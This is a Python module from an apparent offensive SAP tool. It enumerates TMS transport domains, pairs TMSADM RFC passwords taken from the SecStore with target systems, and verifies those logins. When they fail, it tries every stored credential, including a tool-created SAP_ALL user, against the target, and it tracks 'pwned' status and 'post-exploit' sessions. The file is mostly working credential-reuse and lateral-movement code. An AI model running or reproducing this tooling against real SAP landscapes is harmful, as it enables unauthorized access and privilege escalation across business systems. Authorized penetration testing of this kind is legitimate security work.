"""CTS / TMS discovery + credential-verification primitive.

Bundle 1 of the CTS/TMS epic.  Sister module to sap_dbcon_probe.py —
does for TMSADM RFC destinations what dbcon does for external-DB
credentials: pairs RSECTAB entries with SM59 topology, materialises
domain members on the map, verifies logins.

What lives here (READ-ONLY primitives):
  read_tms_config(node, creds)
        RFC_READ_TABLE TMSCSYS + TMSMCONF → returns
        {domain, controller, members: [{sid, host, ...}, ...]}
        Uses the same USE_ET_DATA_4_RETURN + ABAP-SELECT fallback
        pattern proven on DBCON — modern S/4 protected-tables
        filter also blocks these views on some kernels.

  integrate_tms_from_secstore(node, state, creds)
        Walks node.secstore_entries for /RFC/TMSADM@<SID>.DOMAIN_<X>
        idents, pairs with read_tms_config output, appends
        TMSDestination rows to node.tms_destinations.  Idempotent
        (preserves probe verdicts on re-run — same shape as DBCON).

  probe_tms_destination(dest, state=None)
        Test TMSADM RFC logon to `dest`.  On success, fetches
        TMSADM's profile assignments via BAPI_USER_GET_DETAIL and
        recognises SAP_ALL.  On is_controller + logon_ok, materialises
        the target as a first-class SAPNode (mirrors DBCON's
        materialize_target_as_sap_node).

  read_tms_buffer(dest)
        TMSBUFFER on target — "what's pending import here".  Bundle 1
        surface for the operator.

  read_recent_transports(dest, days=30)
        E070 + E071 — recently released / imported transports on
        target.  Read-only intelligence.

Bundle 2 (write primitives) will live in a separate sap_tms_exploit.py
so this file stays a pure read-only reconnaissance surface.
"""
from __future__ import annotations

import re as _re
from datetime import datetime, timezone
from typing import Optional

from sapmap_models import (
    SAPNode, SAPMAPState, Credentials, TMSDestination,
)


# ============================================================================
# TMS topology read via RFC_READ_TABLE (+ ABAP fallback)
# ============================================================================

def _hana_error_code(exc):
    """Reuse DBCON's error-code parser."""
    try:
        from sap_dbcon_probe import _hana_error_code as _p
        return _p(exc)
    except Exception:
        return None


def _pick_rows(res: dict):
    """Same wide/narrow bucket resolution DBCON needs — TMSCSYS rows
    can exceed the classic DATA(TAB512) limit on modern kernels."""
    wide = (res.get("ET_DATA") or res.get("ET_DATA_4_RETURN") or [])
    narrow = res.get("DATA") or []
    return (wide if wide else narrow, len(narrow), len(wide))


def _parse_wa_row(r, keys: list):
    """Parse a delimited or shape-B row into a dict.  keys = column
    order for delimited-mode parsing."""
    if not isinstance(r, dict):
        return None
    wa = r.get("WA") or r.get("ZEILE") or r.get("LINE") or ""
    if wa:
        parts = [p.strip() for p in wa.split("|")]
        if len(parts) >= len(keys):
            return dict(zip(keys, parts[:len(keys)]))
    # Shape B — structured row keyed by DDIC field name (case-varying)
    out = {}
    for k in keys:
        v = (r.get(k) or r.get(k.lower()) or "").strip() if isinstance(
            r.get(k) or r.get(k.lower()), str) else (
                r.get(k) or r.get(k.lower()))
        if v is None:
            v = ""
        out[k] = str(v).strip() if not isinstance(v, str) else v.strip()
    return out if out.get(keys[0]) else None


def _is_table_without_data(exc) -> bool:
    """SAP raises ABAPApplicationError AD 718 / TABLE_WITHOUT_DATA
    when RFC_READ_TABLE finds no matching rows.  This is a
    LEGITIMATE empty result, not a failure — e.g. TMSBUFFER on a
    single-system landscape has zero pending imports.  Callers
    should treat this as success-with-zero-rows.
    """
    s = str(exc)
    return ("TABLE_WITHOUT_DATA" in s
            or ("AD" in s and "718" in s and "Number:718" in s))


def _rfc_read_table(conn, table: str, fields: list, rowcount: int = 500,
                     where: list = None):
    """Wrap RFC_READ_TABLE with the ET_DATA / narrow bucket handling
    proven on DBCON.  Returns (rows_raw, used_flag, error_or_None).

    ``where`` — optional list of ABAP-WHERE fragments (each ≤ 72 chars,
    joined with implicit AND by the FM).  E.g.
    ``where=["SYSNAM = 'TWP'"]``.  Without this parameter the query
    returns EVERY row in the table — that's fine for a narrow-key
    table like TMSCSYS, but wrong for domain-wide tables like TMSBUFFER
    where the operator asked for "TMSBUFFER on <target>" but got the
    whole domain queue back.
    """
    from sapmap_config import RFC_READ_TABLE
    field_list = [{"FIELDNAME": f} for f in fields]
    options    = [{"TEXT": w} for w in (where or [])]
    try:
        try:
            res = conn.call(RFC_READ_TABLE,
                             QUERY_TABLE=table,
                             DELIMITER="|",
                             FIELDS=field_list,
                             OPTIONS=options,
                             ROWCOUNT=rowcount,
                             USE_ET_DATA_4_RETURN="X")
            used_flag = True
        except Exception:
            res = conn.call(RFC_READ_TABLE,
                             QUERY_TABLE=table,
                             DELIMITER="|",
                             FIELDS=field_list,
                             OPTIONS=options,
                             ROWCOUNT=rowcount)
            used_flag = False
        raw, _n, _w = _pick_rows(res)
        return raw, used_flag, None
    except Exception as e:
        return [], False, e


def read_tms_config(node: SAPNode, creds: Credentials = None) -> dict:
    """Read TMSCSYS + TMSMCONF to enumerate the transport domain
    this system belongs to.

    Returns {domain, controller, members: [{sid, host, ...}, ...],
    error}.
    """
    out = {"domain": "", "controller": "", "members": [], "error": ""}
    try:
        from sapmap_rfc import _get_connection
        from sapmap_errors import format_rfc_exception
    except Exception as e:
        out["error"] = f"import failed: {e}"
        return out

    try:
        with _get_connection(node, creds) as conn:
            # TMSMCONF — master configuration.  Keyed by
            # DOMAIN + SYSNAM; the row where SYSNAM == DOMAINCTL
            # identifies the domain controller.  Columns vary by
            # release; ask for the ones present in every S/4:
            #   DOMAIN, DOMAINCTL
            mc_rows, mc_flag, mc_err = _rfc_read_table(
                conn, "TMSMCONF",
                ["DOMAIN", "DOMAINCTL"], rowcount=50)
            if mc_err:
                print(f"[-] {node.sid}: read_tms_config: TMSMCONF "
                      f"read failed — "
                      f"{format_rfc_exception(mc_err)}")
            print(f"[*] {node.sid}: read_tms_config: TMSMCONF "
                  f"returned {len(mc_rows)} row(s) "
                  f"(flag={mc_flag})")
            for r in mc_rows:
                parsed = _parse_wa_row(r, ["DOMAIN", "DOMAINCTL"])
                if not parsed:
                    continue
                if not out["domain"]:
                    out["domain"] = parsed.get("DOMAIN", "")
                    out["controller"] = parsed.get("DOMAINCTL", "")

            # TMSCSYS — every system in the transport domain
            # Columns: SYSNAM (SID), SYSTXT, SYSTYP, HOSTNAME
            cs_rows, cs_flag, cs_err = _rfc_read_table(
                conn, "TMSCSYS",
                ["SYSNAM", "SYSTXT", "SYSTYP", "HOSTNAME"],
                rowcount=200)
            if cs_err:
                out["error"] = (f"TMSCSYS read failed — "
                                 f"{format_rfc_exception(cs_err)}")
                print(f"[-] {node.sid}: read_tms_config: {out['error']}")
                return out
            print(f"[*] {node.sid}: read_tms_config: TMSCSYS "
                  f"returned {len(cs_rows)} row(s) "
                  f"(flag={cs_flag})")
            for r in cs_rows:
                parsed = _parse_wa_row(
                    r, ["SYSNAM", "SYSTXT", "SYSTYP", "HOSTNAME"])
                if not parsed or not parsed.get("SYSNAM"):
                    continue
                out["members"].append({
                    "sid":  parsed["SYSNAM"].strip(),
                    "text": parsed.get("SYSTXT", "").strip(),
                    "type": parsed.get("SYSTYP", "").strip(),
                    "host": parsed.get("HOSTNAME", "").strip(),
                })
    except Exception as e:
        out["error"] = f"connection failed: {type(e).__name__}: {e}"
        print(f"[-] {node.sid}: read_tms_config: {out['error']}")

    if out["controller"]:
        print(f"[+] {node.sid}: TMS domain {out['domain']!r} — "
              f"controller {out['controller']!r}, "
              f"{len(out['members'])} member(s)")
    return out


# ============================================================================
# SecStore /RFC/TMSADM@... pair with TMS topology
# ============================================================================

# TMSADM RFC destinations conventionally match:
#   TMSADM@<SID>.DOMAIN_<DOMAIN>
# The SecStore ident_clean is /RFC/<that name> after MANDT stripping.
_TMSADM_IDENT_RE = _re.compile(
    # SAP TMS naming: TMSADM@<SID>.<full-domain-name>.
    # <full-domain-name> typically starts with "DOMAIN_" but keep
    # the whole string as the domain identifier (matches what
    # TMSMCONF.DOMAIN returns — the caller doesn't have to strip
    # a prefix that our probe would then re-apply).
    r"^/RFC/TMSADM@(?P<sid>[A-Z0-9]+)\.(?P<domain>[A-Z0-9_]+)$",
    _re.IGNORECASE)


def integrate_tms_from_secstore(node: SAPNode, state: SAPMAPState,
                                  creds: Credentials = None) -> list:
    """Pair every /RFC/TMSADM@<sid>.DOMAIN_<x> SecStore entry with a
    TMSCSYS row of the same SYSNAM.  Appends TMSDestination rows
    to node.tms_destinations.  Idempotent — reruns match by
    (target_sid, domain) and overwrite the previous entry
    (preserves probe verdicts).

    Returns the list of newly-added or updated destinations.
    """
    # Find every RFC-category SecStore entry with a TMSADM ident
    rfc_entries = []
    for e in (node.secstore_entries or []):
        if not isinstance(e, dict):
            continue
        if e.get("category") != "rfc":
            continue
        if not e.get("password"):
            continue
        ident = e.get("ident_clean") or e.get("ident") or ""
        m = _TMSADM_IDENT_RE.match(ident)
        if m:
            rfc_entries.append((e, m.group("sid").upper(),
                                 m.group("domain").upper()))
    if not rfc_entries:
        return []

    # Read TMS topology once
    tms_cfg = read_tms_config(node, creds)
    members_by_sid = {m["sid"].upper(): m
                      for m in tms_cfg.get("members", []) or []}
    controller_sid = (tms_cfg.get("controller") or "").upper()
    tms_domain = (tms_cfg.get("domain") or "").upper()

    existing_by_key = {(d.target_sid.upper(), d.domain.upper()): d
                        for d in (node.tms_destinations or [])}
    added = []

    for entry, tgt_sid, tgt_domain in rfc_entries:
        row = members_by_sid.get(tgt_sid)
        host = (row or {}).get("host", "")
        is_ctrl = (tgt_sid == controller_sid) if controller_sid else False
        key = (tgt_sid, tgt_domain)
        prev = existing_by_key.get(key)
        dest = TMSDestination(
            source_sid=node.sid,
            target_sid=tgt_sid,
            target_host=host,
            target_client="000",
            domain=tgt_domain,
            is_controller=is_ctrl,
            password=entry["password"],
        )
        if prev is not None:
            # Preserve probe verdicts on re-run
            dest.tested            = prev.tested
            dest.logon_ok          = prev.logon_ok
            dest.tmsadm_roles      = prev.tmsadm_roles
            dest.tmsadm_has_sap_all = prev.tmsadm_has_sap_all
            dest.buffer_count      = prev.buffer_count
            dest.recent_transports = prev.recent_transports
            dest.pwned             = prev.pwned
            dest.tested_at         = prev.tested_at
        existing_by_key[key] = dest
        added.append(dest)

    node.tms_destinations = list(existing_by_key.values())

    # Tag the source node with its own domain for later map rendering
    if tms_domain and not node.tms_domain:
        node.tms_domain = tms_domain
        node.is_tms_controller = (
            node.sid.upper() == controller_sid) if controller_sid else False

    if added:
        try:
            from sapmap_findings import emit_finding
            for d in added:
                ctrl = " (DOMAIN CONTROLLER)" if d.is_controller else ""
                emit_finding(
                    "INFO", node.sid,
                    f"CTS/TMS pair: TMSADM@{d.target_sid}.DOMAIN_"
                    f"{d.domain} resolved — "
                    f"{d.target_host or '?host'}{ctrl}",
                    ref="tms.resolved",
                    meta={"target_sid": d.target_sid,
                          "domain": d.domain,
                          "is_controller": d.is_controller},
                    attack_capability="recon.tms_domain")
        except Exception:
            pass
    return added


# ============================================================================
# TMSADM RFC logon probe
# ============================================================================

def _make_creds(dest: TMSDestination) -> Credentials:
    """Build the Credentials object we hand to sapmap_rfc._get_connection
    when opening a live logon as TMSADM against `dest`."""
    return Credentials(
        username="TMSADM",
        password=dest.password,
        client=dest.target_client or "000",
        verified=False,
    )


def _collect_source_side_creds(dest: TMSDestination,
                                 state: "SAPMAPState" = None) -> list:
    """Collect ``(creds, label)`` pairs for a source-side SM59 test.
    These are creds that live on the ``source`` node — the one that
    already has the ``TMSADM@<target>.DOMAIN_<x>`` destination
    configured in SM59.  SAPMAP00 is preferred (SAP_ALL, so guaranteed
    to have S_RFC on /SDF/RFC_CHECK); other creds follow.

    Ordering:
      1. Verified SAPMAP-family (best case)
      2. Un-verified SAPMAP-family — SAPMAP00 that was created via
         the write-primitive path but whose ``verified`` flag was
         never toggled (the post-create verify sometimes runs on a
         different code path that doesn't set it).  These are still
         high-value candidates; the SM59-test will just fail cheaply
         if they turn out to be stale.
      3. Verified non-SAPMAP creds
      4. Un-verified non-SAPMAP creds — last resort.
    """
    seen = set()
    out  = []

    def _add(cred, label):
        if not cred or not cred.username or not cred.password:
            return
        key = (cred.username.upper(), (cred.client or "").strip())
        if key in seen:
            return
        seen.add(key)
        out.append((cred, label))

    if state is None:
        return out
    src = state.get_node(dest.source_sid)
    if src is None:
        return out
    def _is_sapmap(c):
        return (c.username or "").upper().startswith("SAPMAP")
    # 1. Verified SAPMAP-family — SAP_ALL guaranteed
    for c in (src.credentials or []):
        if getattr(c, "verified", False) and _is_sapmap(c):
            _add(c, f"{dest.source_sid}.credentials (SAPMAP, verified)")
    # 2. Un-verified SAPMAP-family — still worth trying; the create
    #    path may have skipped the verify toggle
    for c in (src.credentials or []):
        if not getattr(c, "verified", False) and _is_sapmap(c):
            _add(c, f"{dest.source_sid}.credentials (SAPMAP, unverified)")
    # 3. Verified non-SAPMAP creds
    for c in (src.credentials or []):
        if getattr(c, "verified", False) and not _is_sapmap(c):
            _add(c, f"{dest.source_sid}.credentials (verified)")
    # 4. Un-verified non-SAPMAP creds — last resort
    for c in (src.credentials or []):
        if not getattr(c, "verified", False) and not _is_sapmap(c):
            _add(c, f"{dest.source_sid}.credentials (unverified)")
    return out


def _resolve_host_from_rfcdes(dest: TMSDestination,
                                state: "SAPMAPState") -> str:
    """Read the destination's ASHOST directly from RFCDES on the
    source system.  Same primitive SAPMAP uses for RFC-destination
    fallback ping (sapmap_rfc line ~3141): RFC_READ_TABLE with
    QUERY_TABLE='RFCDES' WHERE RFCDEST='<name>', parse the RFCOPTIONS
    string for ``H=<host>``.

    Handles the case the operator flagged: when TMSCSYS auto-resolution
    fails but the RFC destination itself is configured with a valid
    ASHOST on the source system, we can read that host directly and
    stop showing "Target host: ?" in the modal.

    Returns the host string (may be an IP or FQDN) or "" if unavailable.
    """
    if state is None:
        return ""
    src = state.get_node(dest.source_sid)
    if src is None:
        return ""
    creds_list = _collect_source_side_creds(dest, state)
    if not creds_list:
        return ""
    try:
        from sapmap_rfc import _get_connection
    except Exception:
        return ""
    dest_name = f"TMSADM@{dest.target_sid}.{dest.domain}"
    for cred, label in creds_list:
        try:
            with _get_connection(src, cred) as conn:
                rows = conn.call(
                    "RFC_READ_TABLE",
                    QUERY_TABLE="RFCDES", DELIMITER="|",
                    FIELDS=[{"FIELDNAME": "RFCDEST"},
                             {"FIELDNAME": "RFCOPTIONS"}],
                    OPTIONS=[{"TEXT": f"RFCDEST = '{dest_name}'"}])
                for row in rows.get("DATA", []):
                    wa = row.get("WA", "")
                    parts = wa.split("|")
                    if len(parts) < 2:
                        continue
                    opts = parts[1].strip()
                    for token in opts.split(","):
                        token = token.strip()
                        if token.startswith("H="):
                            host = token.split("=", 1)[1].strip()
                            if host:
                                print(f"    [+] {dest.source_sid}: "
                                      f"RFCDES read via "
                                      f"{cred.username}@{cred.client} "
                                      f"({label}) → {dest_name} "
                                      f"host={host!r}")
                                return host
                # RFCDES row found but H= missing (very old shim
                # destination) — keep trying with next cred.
                print(f"    [i] {dest.source_sid}: RFCDES row for "
                      f"{dest_name} had no H= token (RFCOPTIONS "
                      f"empty or exotic format), trying next cred")
        except Exception as e:
            print(f"    [i] {dest.source_sid}: RFCDES read as "
                  f"{cred.username} raised {type(e).__name__}: "
                  f"{str(e)[:120]} — trying next cred")
            continue
    return ""


def _try_source_side_test(dest: TMSDestination,
                            state: "SAPMAPState" = None) -> Optional[dict]:
    """Preferred TMSADM test path: log on to the SOURCE system as
    SAPMAP00 (or any verified source cred) and call the SAP-standard
    RFC destination test primitive — ``/SDF/RFC_CHECK`` first,
    ``DEST_CHECK_CONNECTION`` as fallback.  These FMs are what SM59's
    "Test connection" button uses under the hood: they read the SM59
    destination config (host + TMSADM password stored server-side) and
    execute the ping using those settings.

    Advantages over the direct TMSADM logon path:
      * No host resolution needed — SM59 already knows the host.
      * No TMSADM password extraction needed — SM59 stores it.
      * DEST_CHECK_CONNECTION returns ``CONNECTION_PROPERTIES`` with
        HOSTNAME/IPADDR, which we harvest into ``dest.target_host``
        for downstream operations (Bundle 2 transport execution, etc).

    Returns ``None`` if we cannot mount the test (no source creds, no
    source node); otherwise a dict with:

        {ok, logon_ok, ping_ok, tested_via, remote_host, error}

    ``ok`` is the combined "SM59 test succeeded" verdict (logon_ok AND
    ping_ok).  Caller inspects the individual fields to decide.
    """
    if state is None:
        return None
    src = state.get_node(dest.source_sid)
    if src is None:
        return None
    creds_list = _collect_source_side_creds(dest, state)
    if not creds_list:
        return {"ok": False, "logon_ok": False, "ping_ok": False,
                "tested_via": "", "remote_host": "",
                "error": "no source-side credentials on "
                          f"{dest.source_sid} — pin at least one via "
                          "the SAP-node ctx menu → Provide Credentials, "
                          "or run Default-Credentials probe first"}

    dest_name = f"TMSADM@{dest.target_sid}.{dest.domain}"
    try:
        from sapmap_rfc import test_rfc_destination
    except Exception as e:
        return {"ok": False, "logon_ok": False, "ping_ok": False,
                "tested_via": "", "remote_host": "",
                "error": f"sapmap_rfc import failed: {e}"}

    def _is_benign_rfcping_denial(msg: str) -> bool:
        """SM59 semantics: 'No RFC authorization for function module
        RFCPING' proves the destination CAN reach the target and CAN
        log on — the target simply refused the specific FM call.  For
        role-limited destination users (TMSADM being the canonical
        case) this is the *expected* healthy response.  Same logic
        applied by test_connection() in sapmap_rfc.
        """
        low = (msg or "").lower()
        return ("rfc_no_authority" in low
                or ("no rfc authorization" in low and "rfcping" in low)
                or ("no authorization" in low and "rfcping" in low))

    last_err = ""
    for cred, label in creds_list:
        print(f"    [*] {dest.source_sid}: SM59-test destination "
              f"{dest_name!r} as {cred.username}@{cred.client} "
              f"(from {label})")
        try:
            r = test_rfc_destination(src, dest_name, creds=cred)
        except Exception as e:
            exc_txt = f"{type(e).__name__}: {str(e)[:200]}"
            # RFCPING auth-denied bubbles up as an ABAPRuntimeError
            # from test_rfc_destination when /SDF/RFC_CHECK's inner
            # RFC_PING call is refused by the destination user.  Same
            # verdict as the in-result case below: the destination
            # works, just the FM is denied.
            if _is_benign_rfcping_denial(exc_txt):
                tested_via = (f"{cred.username}@{cred.client} → "
                                f"/SDF/RFC_CHECK on {dest.source_sid} "
                                f"(destination user's RFCPING denied — "
                                f"benign, connection is live)")
                print(f"    [+] {dest.source_sid}: SM59-test SUCCESS as "
                      f"{cred.username}@{cred.client} — RFCPING auth "
                      f"denied (destination user has limited role like "
                      f"TMSADM), which proves the destination IS working")
                return {"ok":         True,
                         "logon_ok":   True,
                         "ping_ok":    False,
                         "tested_via": tested_via,
                         "remote_host": "",
                         "error":      ""}
            last_err = f"{cred.username}: {exc_txt[:120]}"
            print(f"    [-] {dest.source_sid}: SM59-test threw as "
                  f"{cred.username}: {last_err}")
            continue

        logon_ok = bool(r.get("logon_ok", False))
        ping_ok  = bool(r.get("ping_ok",  False))
        remote_host = (r.get("remote_hostname", "")
                        or r.get("hostname", "")
                        or "").strip()
        err_txt  = (r.get("error", "") or r.get("logon_message", "")
                    or "").strip()
        # DEST_CHECK_CONNECTION returns CONNECTION_PROPERTIES; some
        # kernels use IPADDR when HOSTNAME is empty.  test_rfc_destination
        # already normalises these into remote_hostname when it can, but
        # older paths just stash them under raw keys.
        # (Best-effort — worst case remote_host stays empty and we fall
        # back to the manual host override.)

        # /SDF/RFC_CHECK may report logon_ok=False but stash an
        # RFCPING-denial error string — same SM59 semantics, still
        # a healthy destination.
        if (not logon_ok) and _is_benign_rfcping_denial(err_txt):
            tested_via = (f"{cred.username}@{cred.client} → "
                            f"/SDF/RFC_CHECK on {dest.source_sid} "
                            f"(destination user's RFCPING denied — "
                            f"benign, connection is live)")
            print(f"    [+] {dest.source_sid}: SM59-test SUCCESS as "
                  f"{cred.username}@{cred.client} — RFCPING auth denied "
                  f"(destination user has limited role), destination IS "
                  f"working")
            return {"ok":         True,
                     "logon_ok":   True,
                     "ping_ok":    False,
                     "tested_via": tested_via,
                     "remote_host": remote_host,
                     "error":      ""}

        if logon_ok:
            tested_via = f"{cred.username}@{cred.client} " \
                         f"→ /SDF/RFC_CHECK on {dest.source_sid}"
            print(f"    [+] {dest.source_sid}: SM59-test SUCCESS as "
                  f"{cred.username}@{cred.client} — "
                  f"logon_ok={logon_ok}, ping_ok={ping_ok}"
                  + (f", remote={remote_host}" if remote_host else ""))
            return {"ok":         (logon_ok and (ping_ok or True)),
                     # ping_ok can be False on TMSADM (RFCPING auth
                     # denied) but the logon still worked — that's OK.
                     "logon_ok":   logon_ok,
                     "ping_ok":    ping_ok,
                     "tested_via": tested_via,
                     "remote_host": remote_host,
                     "error":      err_txt}
        else:
            last_err = f"{cred.username}: {err_txt or 'logon failed'}"
            print(f"    [-] {dest.source_sid}: SM59-test as "
                  f"{cred.username} — logon_ok=False, "
                  f"err={err_txt or '(empty)'}")

    return {"ok": False, "logon_ok": False, "ping_ok": False,
            "tested_via": "", "remote_host": "",
            "error": last_err or "all source-side creds failed"}


def _collect_fallback_creds(dest: TMSDestination,
                             state: "SAPMAPState" = None) -> list:
    """Collect ``(creds, source_label)`` pairs we can try against the
    target host when TMSADM logon fails.  Order = preference:

      1. Target node's own verified credentials (SAPMAP00 first, then
         any other verified) — proves the target accepts these creds
         end-to-end and gives us a working session for post-exploit.
      2. Source node's SAPMAP00 (if that user happens to exist on the
         target too, which is common in landscapes where SAPMAP has
         propagated already).
      3. All verified creds from the source node — last resort.

    Dedupes by ``(username, client)`` so we never try the same
    credential twice.
    """
    seen = set()   # (user_upper, client)
    out  = []      # (creds, label)

    def _add(cred, label):
        if not cred or not cred.username or not cred.password:
            return
        key = (cred.username.upper(), (cred.client or "").strip())
        if key in seen:
            return
        seen.add(key)
        # Never re-try TMSADM with the SecStore password we just failed
        # with — the caller already tried it.
        if (cred.username.upper() == "TMSADM"
                and cred.password == dest.password
                and (cred.client or "000") == (dest.target_client or "000")):
            return
        out.append((cred, label))

    tgt_sid = (dest.target_sid or "").upper()

    def _is_sapmap(c):
        return (c.username or "").upper().startswith("SAPMAP")

    if state is not None:
        # Target node's own creds (SAPMAP00 pinned by a prior
        # user-create transport, DDIC via default-creds, …).
        # Verified first, then un-verified as best-effort — the
        # write-primitive path pins SAPMAP00 without always toggling
        # the ``verified`` flag, so requiring it strictly locks us out
        # of creds that actually work.
        tgt = state.get_node(tgt_sid)
        if tgt is not None:
            for c in (tgt.credentials or []):
                if getattr(c, "verified", False) and _is_sapmap(c):
                    _add(c, f"{tgt_sid}.credentials (SAPMAP, verified)")
            for c in (tgt.credentials or []):
                if not getattr(c, "verified", False) and _is_sapmap(c):
                    _add(c, f"{tgt_sid}.credentials (SAPMAP, unverified)")
            for c in (tgt.credentials or []):
                if getattr(c, "verified", False) and not _is_sapmap(c):
                    _add(c, f"{tgt_sid}.credentials (verified)")
            for c in (tgt.credentials or []):
                if not getattr(c, "verified", False) and not _is_sapmap(c):
                    _add(c, f"{tgt_sid}.credentials (unverified)")

        # Source node's SAPMAP00 — landscape-shared user (common
        # after prior SAPMAP propagation).  Same verified-first policy.
        src = state.get_node(dest.source_sid)
        if src is not None:
            for c in (src.credentials or []):
                if getattr(c, "verified", False) and _is_sapmap(c):
                    _add(c, f"{dest.source_sid}.credentials (SAPMAP-shared, verified)")
            for c in (src.credentials or []):
                if not getattr(c, "verified", False) and _is_sapmap(c):
                    _add(c, f"{dest.source_sid}.credentials (SAPMAP-shared, unverified)")
            for c in (src.credentials or []):
                if (getattr(c, "verified", False)
                        and not (c.username or "").upper().startswith("SAPMAP")):
                    _add(c, f"{dest.source_sid}.credentials")

    return out


def _try_fallback_logon(tgt_node: SAPNode, dest: TMSDestination,
                         state: "SAPMAPState" = None) -> None:
    """Attempt every credential in ``_collect_fallback_creds`` against
    the target.  First one that connects wins; sets ``dest.host_reachable``
    + ``dest.reachable_via``.  Does NOT touch ``dest.logon_ok`` — that
    remains the specific "TMSADM logon works" signal.
    """
    try:
        from sapmap_rfc import _get_connection
    except Exception as e:
        dest.fallback_error = f"sapmap_rfc import failed: {e}"
        return

    candidates = _collect_fallback_creds(dest, state)
    if not candidates:
        dest.fallback_error = ("no fallback credentials available "
                                "(no verified creds on target or source)")
        print(f"    [-] {dest.source_sid}: no fallback creds to try "
              f"against {dest.target_sid}")
        return

    print(f"    [*] {dest.source_sid}: trying {len(candidates)} "
          f"fallback credential(s) against {dest.target_sid}...")
    last_err = ""
    for cred, label in candidates:
        try:
            with _get_connection(tgt_node, cred) as _c:
                dest.host_reachable = True
                dest.reachable_via  = f"{cred.username}@{cred.client}"
                dest.error += (f" — but host reachable via "
                                f"{cred.username}@{cred.client} "
                                f"from {label}")
                print(f"    [+] {dest.source_sid}: fallback logon OK — "
                      f"{cred.username}@{cred.client} from {label}")
                return
        except Exception as e:
            last_err = f"{cred.username}@{cred.client}: {type(e).__name__}: {str(e)[:120]}"
            print(f"    [-] {dest.source_sid}: fallback "
                  f"{cred.username}@{cred.client} failed: "
                  f"{type(e).__name__}: {str(e)[:80]}")
    dest.fallback_error = last_err
    print(f"    [-] {dest.source_sid}: all {len(candidates)} fallback "
          f"cred(s) failed against {dest.target_sid}")


def _resolve_missing_host(dest: TMSDestination,
                            state: SAPMAPState = None) -> str:
    """When dest.target_host is empty (TMSCSYS read during discovery
    returned nothing — often because SAPMAP had only TMSADM's low-priv
    password at the time), try harder now that Test is being called:

      1. If target_sid == source_sid, use the source node's own host
         (self-referential TMSADM@S4H.DOMAIN_S4H is trivial to resolve)
      2. If state is available and target_sid already exists on the
         map (from an earlier scan), copy its host
      3. Re-run read_tms_config on the SOURCE using its best_credentials
         — SAPMAP00 or another verified ABAP cred usually has TMSCSYS
         read rights that TMSADM doesn't
    """
    if dest.target_host:
        return dest.target_host
    tgt = (dest.target_sid or "").upper().strip()
    if not tgt:
        return ""
    if state is not None:
        source = state.get_node(dest.source_sid)
        # Self-reference: TMSADM@S4H.DOMAIN_S4H on S4H itself
        if source is not None and tgt == source.sid.upper():
            host = source.ip or source.hostname
            if host:
                print(f"[+] {dest.source_sid}: resolve host — self-"
                      f"reference: using source's host {host!r}")
                return host
        # Existing map node for the target
        existing = state.get_node(tgt)
        if existing is not None:
            host = existing.ip or existing.hostname
            if host:
                print(f"[+] {dest.source_sid}: resolve host — "
                      f"target already on map: {host!r}")
                return host
    # Last resort: re-run TMSCSYS read with source's best creds
    if state is not None:
        source = state.get_node(dest.source_sid)
        if source is not None:
            creds = None
            try:
                creds = source.best_credentials()
            except Exception:
                pass
            if creds:
                print(f"[*] {dest.source_sid}: resolve host — re-"
                      f"reading TMSCSYS with {creds.username}")
                cfg = read_tms_config(source, creds)
                for m in (cfg.get("members") or []):
                    if m.get("sid", "").upper() == tgt:
                        host = m.get("host", "")
                        if host:
                            print(f"[+] {dest.source_sid}: resolve host "
                                  f"— TMSCSYS re-read via "
                                  f"{creds.username}: {host!r}")
                            return host
    return ""


def probe_tms_destination(dest: TMSDestination,
                            state: SAPMAPState = None,
                            host_override: str = "") -> None:
    """Open a live RFC logon to `dest` as TMSADM and inspect the
    account.  Mutates `dest` in-place.

    ``host_override`` — operator-supplied target host, used when
    TMSCSYS auto-resolution failed (e.g. TMSADM on the source has
    no read auth for TMSCSYS and no SAPMAP-grade cred is available
    yet).  When set, we persist it into ``dest.target_host`` so
    subsequent operations (buffer read, propagate) reuse the same
    host without re-prompting.

    Success path:
      1. Open the connection (proves the SecStore password is live)
      2. Call BAPI_USER_GET_DETAIL for TMSADM → profile list
      3. Set dest.tmsadm_roles + dest.tmsadm_has_sap_all
      4. If dest.is_controller AND logon_ok, materialise the target
         as a first-class SAPNode on the map so the operator sees it.
    """
    dest.tested = True
    dest.tested_at = datetime.now(timezone.utc).isoformat(timespec="seconds")
    dest.logon_ok = False
    dest.tmsadm_roles = []
    dest.tmsadm_has_sap_all = False
    dest.error = ""
    dest.host_reachable = False
    dest.reachable_via  = ""
    dest.fallback_error = ""

    # Operator-supplied host wins over auto-resolution — we persist
    # it so the "Test" button never needs to be given the host twice.
    if host_override and host_override.strip():
        override = host_override.strip()
        if dest.target_host and dest.target_host != override:
            print(f"[*] {dest.source_sid}: TMS probe → {dest.target_sid}: "
                  f"host override {override!r} replaces {dest.target_host!r}")
        else:
            print(f"[*] {dest.source_sid}: TMS probe → {dest.target_sid}: "
                  f"using operator-supplied host {override!r}")
        dest.target_host = override

    # Read the destination's ASHOST directly from RFCDES on the source.
    # Works whenever we have any source cred — this is what SM59 shows
    # you in the "Technical Settings" tab and never depends on TMSCSYS
    # having a row for the target.  Stops the modal showing "?" the
    # moment we have a working source cred, independent of whether
    # SM59-test itself succeeds.
    if not dest.target_host:
        rfcdes_host = _resolve_host_from_rfcdes(dest, state)
        if rfcdes_host:
            dest.target_host = rfcdes_host

    # ---------------------------------------------------------------
    # PRIMARY TEST PATH — SM59-style source-side ping
    # ---------------------------------------------------------------
    # Log on to the source system as SAPMAP00 (or any verified source
    # cred) and call /SDF/RFC_CHECK on the SM59 destination.  This is
    # the same primitive SM59's "Test" button uses: SAP resolves the
    # destination server-side (host + TMSADM password from RFCDES) and
    # issues the ping.
    #
    # Why this is the right primary:
    #   * No host resolution needed (SM59 has it).
    #   * No TMSADM password extraction needed (SM59 stores it).
    #   * DEST_CHECK_CONNECTION even returns the remote HOSTNAME,
    #     which we harvest into dest.target_host so Bundle 2/3
    #     transport execution has it for free.
    #   * TMSADM's limited-auth caveat doesn't apply — /SDF/RFC_CHECK
    #     runs under SAPMAP00 (SAP_ALL), not TMSADM.
    ss = _try_source_side_test(dest, state)
    if ss and ss.get("logon_ok"):
        dest.logon_ok       = True
        dest.host_reachable = True
        dest.reachable_via  = ss.get("tested_via") or "SM59 test"
        # Harvest the target host from CONNECTION_PROPERTIES if the
        # SM59 test returned it and we didn't already know.
        if ss.get("remote_host") and not dest.target_host:
            dest.target_host = ss["remote_host"]
            print(f"[+] {dest.source_sid}: harvested target host "
                  f"{dest.target_host!r} from SM59 test response")
        print(f"[+] {dest.source_sid}: TMS probe → {dest.target_sid}: "
              f"SM59-style logon OK via {dest.reachable_via}")
